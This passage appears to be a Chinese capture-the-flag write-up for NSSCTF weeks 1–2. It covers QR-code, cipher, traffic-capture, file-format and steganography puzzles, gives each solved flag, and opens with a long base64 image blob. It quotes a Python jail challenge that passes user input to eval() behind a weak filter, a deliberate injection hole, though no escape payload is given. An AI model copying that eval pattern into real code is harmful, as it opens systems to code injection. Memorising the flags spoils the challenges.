h3BoBjXKN3zFftwyhVZcObnp/VIdxawQ0yjV+x3zdMoRWXTq46f1RHcatEdAo1/gd83XLEFp16eCm90d1GLdGQKNc43fM1y1DaNWlg5veH9Vh3BqB8UZJF5ViSP+rUun+WjpoXRpHuaTnQfujcS0d6bo0H+WSjhu/B5/DO0wPOC033R9dwLQOWpfGUS7qeE00zY/mo/NNx43fA41ybeStBRy/WB8fCKw6NMp/CIzfA40S3fO3QRrlnkNfm9LPv6bzTR96ui7N93NSa1+m+a118/Vr/xnlItHWAo5fLF+US5tF94ruAc231PTCx1THQomlTzXKJXy/frUWcPxiaZRLm0X3iu4BzbfU9MLHVMdCiaVPNcolfBrld/joYY4/kJLhp/nRfIvn8OPPx++B/4zyx7P9/WFrAccvVslg1qb54p9NlXTQvaJ7QPOl+dF8VAfNl47zRblItLWA4xerZDCL4/zyOZ1veh7pujRfmh/Nl+ZH69I4jZKS+iautYDjF0ujXNosuld0D2i+paYXPqY6FkosfXqMUVLQrYWh/S1Nc+HjNBeqN113AcGWTykX2gzlR+vSfLQ/Wpfma8VplJvIT1+Y1oGk624a54/LpPeA8qN1aT4KgNal+VpxGuUm8tMXpnUg6bqbxvnjMuk9oPxoXZqPAqB1ab5WnEa5ifz0hWkdSLrupnH+uEx6Dyg/WpfmowBoXZqvFadRbiI/fWFaB5Kuu2mcPy6T3gPKj9al+SgAWpfma8VplJvIT1+Y1oGk624a54/LpPeA8qN1aT4KgNal+VpxGuUm8tMXpnUg6bqbxvnjMuk9oPxoXZqPAqB1ab5WnEa5ifz0hWkdSLrupnH+uEx6Dyg/WpfmowBoXZqvFadRbiI/fWFaB5Kuu2mcPy6T3gPKj9al+SgAWpfma8VplJvIT1+Y1oGk624a54/LpPeA8qN1aT4KgNal+Vpx442SgqEDbg2O9kf1puPSXNJ6aX/T66Z10HzpfXlaPo1y08TTB5xuO31wab20v+l10zpovvS+PC2fRrlp4ukDTredPri0Xtrf9LppHTRfel+elk+j3DTx9AGn204fXFov7W963bQOmi+9L0/Lp1Fumnj6gNNtpw8urZf2N71uWgfNl96Xp+XTKDdNPH3A6bbTB5fWS/ubXjetg+ZL78vT8mmUmyaePuB02+mDS+ul/U2vm9ZB86X35Wn5NMpNE08fcLrt9MGl9dL+ptdN66D50vvytHwa5aaJpw843Xb64NJ6aX/T66Z10HzpfXlaPo1y08TTB5xuO31wab20v+l10zpovvS+PC2fRvnNxFsHl15AqoMeHM1HddC6NB/tL1033R/NR+Oo3jS/dD6qNx2nUWqUvwmkD4kuKq1L800/TNof1UvjKGfaXysf1ZuO0yg1So0yfVV/yEeNKN1Sy9ioXtpfmgvNp1FqlBolvZZAHDWOQKn/SUGNiPbXypfmQvNplBqlRkmvJRBHjShQSqMMQtQoNUqNMnhQf0ulUb4mRF+of+N71/9eo9QoNcq7rutFXo1So9y4bl9L0QWkv1w0HxVN69J8NI7qoP3RfLQ/Wpfmo/2l66b7o/loHNWb5pfOR/Wm43xR+qL0RZm+qj/ko8aRbkmjXCOqUWqUGuXaDV36WqP0T+9LC5MObi0g1XHKLzrl3NJL59HSQfuj/Gg+Gtfi0tKLuXxO7xAqoQOG6eJhFDPVYb61EbU4067pfGk+Gtfi0tKLuWiUFNVaHF2E6Ys6vT86pZYO2h/dF5qPxrW4tPRiLholRbUWRxdh+qJO749OqaWD9kf3heajcS0uLb2Yi0ZJUa3F0UWYvqjT+6NTaumg/dF9ofloXItLSy/molFSVGtxdBGmL+r0/uiUWjpof3RfaD4a1+LS0ou5aJQU1VocXYTpizq9Pzqllg7aH90Xmo/Gtbi09GIuGiVFtRZHF2H6ok7vj06ppYP2R/eF5qNxLS4tvZiLRklRrcXRRZi+qNP7o1Nq6aD90X2h+Whci0tLL+aiUVJUa3F0EaYv6vT+6JRaOmh/dF9oPhrX4tLSi7lMN8rW4CjAdNz0hUnrTeej+5KuS/Ol59vSm9ZB+bXixv+73nQR6OBovtZAqI5Wf9PrPm2+Lb1P21ONctjlP20B0/hbxkF1pOfb0pvWQfm14jTKFvlv6j5tAdP4W8ZBdaTn29Kb1kH5teI0yhZ5jfIW8i3joGLSBtPSm9ZB+bXiNMoWeY3yFvIt46Bi0gbT0pvWQfm14jTKFnmN8hbyLeOgYtIG09Kb1kH5teI0yhZ5jfIW8i3joGLSBtPSm9ZB+bXiNMoWeY3yFvIt46Bi0gbT0pvWQfm14jTKFnmN8hbyLeOgYtIG09Kb1kH5teLGG2ULTLpua6HTOmi+9CG1+KV1UH4tvbS/FhfaXzpOo0wT/Sbf9MVPY0gfUotfWgfl3NJL+2txof2l4zTKNFGN8jeB9CG1jCOtg65bSy/tr8WF9peO0yjTRDVKjTKwUxplAGIwhUYZhPmnVNMXP40h/eJo8UvroJxbeml/LS60v3ScRpkm6ovSF2VgpzTKAMRgCo0yCNMX5X8JpF8cLeNI66Dr1tJL+2txof2l4zTKNFFflL4oAzulUQYgBlNolEGYvih9UabWSaNMkczk0SgzHP+aZfri/1XAxYD0n2YtfmkdFGNLL+2vxYX2l457nFG2FjC9WFQHrUvz0QVM103nm66D9peOS+8B7Y/Ol+ZLx2mUaaLf5EsvAl1oWpfmo7jSddP5puug/aXj0ntA+6PzpfnScRplmqhG+ZsAXXx6mOl8dOzpujQf7S8dR+eRrjuey/T/d7XpgZyyCFQHXUCaj84jXTedb7oO2l86Lr0HtD86X5ovHeeLMk3UF6Uvyj/s1HhD+PjYdBH/W2Y8F1+Ue/YivQj0l5/WpfkorXTddL7pOmh/6bj0HtD+6HxpvnScL8o0UV+Uvih9UV6+Ko3yMrJ7PzjlF5PqoAtI89HppOum803XQftLx6X3gPZH50vzpeN8UaaJ+qL0RemL8vJVaZSXkd37wSm/mFQHXUCaj04nXTedb7oO2l86Lr0HtD86X5ovHTf+RTl9cNP7iy9M6T8VpTrSB9eaL9VL4yiXtF5al+poxWmUi38qpxeLLkJrAVt6W1ym601zSett7SnlQuM0So2S7srvuPQhXSoOgtOHOV0vQHLLPzNO16X5WnEapUZ5afemG4dG+XqclEt6vrTupSUsBGuUGuWltUsf0qXiIDh9mNP1AiS+KCmkP8RplBrlpTWabhwapS/KSwsNgzVKjRKuyr/DNMpLuMYE0x+Q9Hxp3TGgvmlEo9QoL+1o+pAuFQfB6cOcrhcg8U9vCsk/va+TogfXOiTa33Xlf/6ipZfqSHOZrjfNJa03PQ+qNx3ni9IX5aWdSh/SpeIgOH2Y0/UCJL4oKaR3flEGND46RevQqWHR/mi+9LBP6S/NpTWPtA6ab/yLkgox7jUBeuhpfvSQaH80X1rHKf2lubTmkdZB82mUlNSbxtFDT8ujh0T7o/nSOk7pL82lNY+0DppPo6Sk3jSOHnpaHj0k2h/Nl9ZxSn9pLq15pHXQfBolJfWmcfTQ0/LoIdH+aL60jlP6S3NpzSOtg+bTKCmpN42jh56WRw+J9kfzpXWc0l+aS2seaR00n0ZJSb1pHD30tDx6SLQ/mi+t45T+0lxa80jroPk0SkrqTePooafl0UOi/dF8aR2n9Jfm0ppHWgfNp1FSUm8aRw89LY8eEu2P5kvrOKW/NJfWPNI6aD6NkpJ60zh66Gl59JBofzRfWscp/aW5tOaR1kHzjTdKuqhU8ClxrUVNz4PqmF43reOUfKfcm0b5ppOkh5SWN92wqF7Kj+o1HyX/nnEa5XvO7Rc9zLQ8ahy0LtUxvW5axyn56B5Mj9Mop0/om/7oIaXlTTcsqpfyo3rNR8m/Z5xG+Z5z80W5ODeN7TXA9A/D4pjGfK5RjhnFtUbooV/L+vdoekh/z/TvCKpjet20jlPy0T2YHqdRTp+Qf3r/JqBR7nkBUs7UyN/0vL60rVG+6SRbi0oPiWKlOqbXTes4JR/dg+lxGuX0Cfmi9EX5hx2lPyAt433T8/JFecrg6OKn9dLDpHWpjul10zpOyUf3YHrcMS9KuljjB/LxgVqkeqnBmG/PPwNEw70QNH2+F6SMDtUoh41n+uLb3+uFoT806XWbPo+03lY+jbJF/pu60xff/jTKfwi0fhha56pRtshrlJf+Qxp6mNONPL1uT9Ob5kfzaZSU1Ka46Ytvf74ofVFuMoMrZdKHeaV2Izat13xrxpbml96pdH/pfGm9rXy+KFvk/dPbP70Du5c2tnS+gMQRKTTKEWP4bxPpRTWfL8orfyqn92XYef24HY3yx+ju+TC9qObTKDXK9VvVKNcZRjNobLOMLT2P6LJc+D8W0vpvDaT1tvI9zijp4qcH0lpUqpf2l+ZC+6N10zrS/VEdrbg0v5aOdF2NMk30m3x0AelhtvKlcVG9tC7lQvOl+6N1W3Fpfi0d6boaZZqoRnmJaNqI0oee7u8SnEJwml9Bwi0lNcpbsH5NSheQHmYrXxoX1UvrUi40X7o/WrcVl+bX0pGuq1GmifqivEQ0bUTpQ0/3dwlOITjNryDhlpIa5S1YfVFSrGkjSh96uj/KpRWX5tfSka6rUaaJ+qK8RDRtROlDT/d3CU4hOM2vIOGWkhrlLVh9UVKsaSNKH3q6P8qlFZfm19KRrqtRpon6orxENG1E6UNP93cJTiE4za8g4ZaSGuUtWH1RUqxpI0ofero/yqUVl+bX0pGuq1GmiQ57UW6S96UMNZjWYdL+WvxoXcqP6k3nS+ug+dJxGmWaqEb5m0D6MNNjov2l66bzpY0tnY/qpXVpvnScRpkmqlFqlJt26p8y1GDoD0M6H0VB69J86TiNMk1Uo9QoN+2URrkPtEa5iTX9xUz/8m+S5z+jLIFu7RXdU4qF6qD50nEaZZqoL0pflJt2yhflPtAa5SbW9BeT/lLTfJvk+aIsgaZ7kN4rmo9ioTpovnScRpkm6ovSF+WmnfJFuQ+0RrmJNf3FpL/UNN8meb4oS6DpHqT3iuajWKgOmi8dp1Gmifqi9EW5aad8Ue4DrVFuYk1/MekvNc1H5dG6NN/T4lrzoHVb86X9Td8XjXLThOjC0IWm+ag8Wpfme1pcax60bmu+tL/p+6JRbpoQXRi60DQflUfr0nxPi2vNg9ZtzZf2N31fNMpNE6ILQxea5qPyaF2a72lxrXnQuq350v6m74tGuWlCdGHoQtN8VB6tS/M9La41D1q3NV/a3/R90Sg3TYguDF1omo/Ko3VpvqfFteZB67bmS/ubvi8a5aYJ0YWhC03zUXm0Ls33tLjWPGjd1nxpf9P3RaPcNCG6MHShaT4qj9al+Z4W15oHrduaL+1v+r5olJsmRBeGLjTNR+XRujTf0+Ja86B1W/Ol/U3fF41y04TowtCFpvmoPFqX5ntaXGsetG5rvrS/6fvyOKMcP5CPD9QiXUB6IK18SOyFIKqXpqRcaL50HNVLddB8VAetS/O14jTKFvlv6tJFpQs4PV8aP9VL61LONF86juqlOmg+qoPWpflacRpli7xGeQv5px061UsNi+ajw6N1ab5WnEbZIq9R3kL+aYdO9VLDovno8Ghdmq8Vp1G2yGuUt5B/2qFTvdSwaD46PFqX5mvFaZQt8hrlLeSfduhULzUsmo8Oj9al+VpxGmWLvEZ5C/mnHTrVSw2L5qPDo3VpvlacRtkir1HeQv5ph071UsOi+ejwaF2arxWnUbbIa5S3kH/aoVO91LBoPjo8Wpfma8VplC3yGuUt5J926FQvNSyajw6P1qX5WnHHGGULYKsuXUC6+K18LX5yeU2ecknPje5fui7Np1FSUsPi6GLRxW/la2GVi0Z5Zfc0yiu0BsW2jC1tMC2kaR3pfNO5pPuj+5yuS/NplJTUsDi6WOkDTudrYU3rSOebziXdH93ndF2aT6OkpIbF0cVKH3A6XwtrWkc633Qu6f7oPqfr0nwaJSU1LI4uVvqA0/laWNM60vmmc0n3R/c5XZfm0ygpqWFxdLHSB5zO18Ka1pHON51Luj+6z+m6NJ9GSUkNi6OLlT7gdL4W1rSOdL7pXNL90X1O16X5NEpKalgcXaz0AafztbCmdaTzTeeS7o/uc7ouzadRUlLD4uhipQ84na+FNa0jnW86l3R/dJ/TdWm+8UZJhRgnAQlI4C4CGuVdZM0rAQkcQ0CjPGaUCpGABO4ioFHeRda8EpDAMQQ0ymNGqRAJSOAuAhrlXWTNKwEJHENAozxmlAqRgATuIqBR3kXWvBKQwDEENMpjRqkQCUjgLgIa5V1kzSsBCRxDQKM8ZpQKkYAE7iKgUd5F1rwSkMAxBDTKY0apEAlI4C4CGuVdZM0rAQkcQ0CjPGaUCpGABO4ioFHeRda8EpDAMQQ0ymNGqRAJSOAuAhrlXWTNKwEJHENAozxmlAqRgATuIqBR3kXWvBKQwDEENMpjRqkQCUjgLgIa5V1kzSsBCRxDQKM8ZpQKkYAE7iKgUd5F1rwSkMAxBDTKY0apEAlI4C4CGuVdZM0rAQkcQ0CjPGaUCpGABO4ioFHeRda8EpDAMQQ0ymNGqRAJSOAuAhrlXWTNKwEJHENAozxmlAqRgATuIqBR3kXWvBKQwDEENMpjRqkQCUjgLgIa5V1kzSsBCRxDQKM8ZpQKkYAE7iKgUd5F1rwSkMAxBDTKY0apEAlI4C4CGuVdZM0rAQkcQ0CjPGaUCpGABO4ioFHeRda8EpDAMQT+BRcYx3yiNPa6AAAAAElFTkSuQmCC
```

显然base64转图片得到二维码

![image-20221002195900154](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021959651.png?x-oss-process=hzy)

扫码得到密文flag

nc{lmTnc}stWceostsfeo__sf

栅栏密码解码，3

nssctf{Welcome_To_nssctf}

## [Week1]calc_jail_beginner_level1

题目附件如下

```
#the function of filter will banned some string ',",i,b
#it seems banned some payload 
#Can u escape it?Good luck!

def filter(s):
    not_allowed = set('"\'`ib')
    return any(c in not_allowed for c in s)

WELCOME = '''
  _                _                           _       _ _   _                _ __ 
 | |              (_)                         (_)     (_) | | |              | /_ |
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| || |
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ || |
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ || |
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_||_|
              __/ |                          _/ |                                  
             |___/                          |__/                                                                                      
'''

print(WELCOME)

print("Welcome to the python jail")
print("Let's have an beginner jail of calc")
print("Enter your expression and I will evaluate it for you.")
input_data = input("> ")
if filter(input_data):
    print("Oh hacker!")
    exit(0)
print('Answer: {}'.format(eval(input_data)))

```

暂时没绕过去

## [WEEK2]扫不出来的二维码

附件是一个二维码

![扫不出来的二维码](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061814532.png?x-oss-process=hzy)

扫码之后又是个附件

![image-20221006181502761](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061815815.png?x-oss-process=hzy)

附件里是个pdf文件，但是打不开发现是压缩包，解压之后得到一个二维码![正如计算机里只有0和1](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061815567.png?x-oss-process=hzy)

在线二维码扫描得到密文flag

[Online Barcode Scanner | Barcode Reader SDK | Dynamsoft](https://demo.dynamsoft.com/barcode-reader/)

base64解码得到flag

nssctf{I_h0te_the_QRc0de!!!!}

## [WEEK2]ez_flow

流量文件分析，一个一个找，最终找到flag在login.php

![image-20221006182648283](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061826400.png?x-oss-process=hzy)

![image-20221006182659477](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061826543.png?x-oss-process=hzy)

NSSCTF{Hacker!!!!_Y0u_g3t_nny_f10w}

## [WEEK2]ex_word

拿到附件是一个word，不能正常打开，改成zip解压看看，发现在images下有个图片不能把正常显示，显示二进制发现是PK，即压缩包

![image-20221006183732557](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061837625.png?x-oss-process=hzy)

改了之后里面有个flag.xml打开是emoji

![image-20221006183805164](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061838236.png?x-oss-process=hzy)

解码得到flag

[Emoji表情符号编码/解码 - 一个工具箱 - 好用的在线工具都在这里！ (atoolbox.net)](http://www.atoolbox.net/Tool.php?Id=937)

nssctf{t01s_1s_th0_tru3_f1ag}

## [WEEK2]Kiana

两张图片

![1](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061842364.png?x-oss-process=hzy)

![2](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061842431.png?x-oss-process=hzy)

stegsolve异或对比，得到flag

![image-20221006184308305](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061843738.png?x-oss-process=hzy)

NSSCTF{come_and_play_bh3}

## [WEEK2]Baldi's Basics

